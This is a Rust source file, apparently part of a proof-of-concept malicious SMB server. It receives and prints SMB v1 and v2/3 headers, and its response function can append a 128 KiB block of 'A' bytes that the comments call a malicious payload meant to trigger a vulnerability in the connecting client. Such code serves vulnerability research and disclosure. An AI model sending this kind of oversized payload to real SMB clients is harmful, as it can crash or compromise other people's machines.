use std::io::{Read, Write};
use std::net::TcpStream;

/// Receive a SMB request.
///
/// This function assumes that each read syscall gives us an entire
/// request packet. In reality, we should read until we have verified
/// that an entire request has been received, but this is fine for a PoC.
pub fn recv_smb_req(stream: &mut TcpStream, buffer: &mut [u8]) {
    let n = stream.read(buffer).unwrap();
    println!("========== smb request (len = {n}) ==========");
    if n > 4 {
        let request = &buffer[4..n];
        print_smb_message(request);
    }
}

/// 128 KiB malicious payload containing just A's.
const PAYLOAD: [u8; 128 * 1024] = [b'A'; 128 * 1024];

/// Send a SMB response.
///
/// This function sends a response back to the SMB client, optionally
/// appending a large malicious payload to trigger the vulnerability.
pub fn send_smb_res(stream: &mut TcpStream, response: &[u8], payload: bool) {
    let mut buffer = response.to_vec();
    if payload {
        buffer.extend_from_slice(&PAYLOAD);
    }
    let netbios_header = (buffer.len() as u32).to_be_bytes();
    stream.write_all(&netbios_header).unwrap();
    stream.write_all(&buffer).unwrap();
    println!("---------- smb response (payload = {payload}) ----------");
    print_smb_message(response);
}

/// Print a SMB message.
///
/// This function prints the headers for SMB v1 or SMB v2/3,
/// or prints the raw bytes if the SMB version cannot be detected.
fn print_smb_message(data: &[u8]) {
    if data.len() > 32 && data[0] == 0xFF {
        // SMB v1
        println!("server component = {:02x?}", &data[..4]);
        println!("smb command      = {:02x?}", &data[4..5]);
        println!("nt status        = {:02x?}", &data[5..9]);
        println!("flags            = {:02x?}", &data[9..10]);
        println!("flags2           = {:02x?}", &data[10..12]);
        println!("process id high  = {:02x?}", &data[12..14]);
        println!("signature        = {:02x?}", &data[14..22]);
        println!("reserved         = {:02x?}", &data[22..24]);
        println!("tree id          = {:02x?}", &data[24..26]);
        println!("process id       = {:02x?}", &data[26..28]);
        println!("user id          = {:02x?}", &data[28..30]);
        println!("multiplex id     = {:02x?}", &data[30..32]);
        println!("payload          = {:02x?}", &data[32..]);
    } else if data.len() > 64 && data[0] == 0xFE {
        // SMB v2/3
        println!("protocol id      = {:02x?}", &data[..4]);
        println!("header length    = {:02x?}", &data[4..6]);
        println!("credit charge    = {:02x?}", &data[6..8]);
        println!("nt status        = {:02x?}", &data[8..12]);
        println!("command          = {:02x?}", &data[12..14]);
        println!("credits granted  = {:02x?}", &data[14..16]);
        println!("flags            = {:02x?}", &data[16..20]);
        println!("chain offset     = {:02x?}", &data[20..24]);
        println!("message id       = {:02x?}", &data[24..32]);
        println!("process id       = {:02x?}", &data[32..36]);
        println!("tree id          = {:02x?}", &data[36..40]);
        println!("session id       = {:02x?}", &data[40..48]);
        println!("signature        = {:02x?}", &data[48..64]);
        println!("payload          = {:02x?}", &data[64..]);
    } else {
        println!("raw              = {:02x?}", data);
    }
}
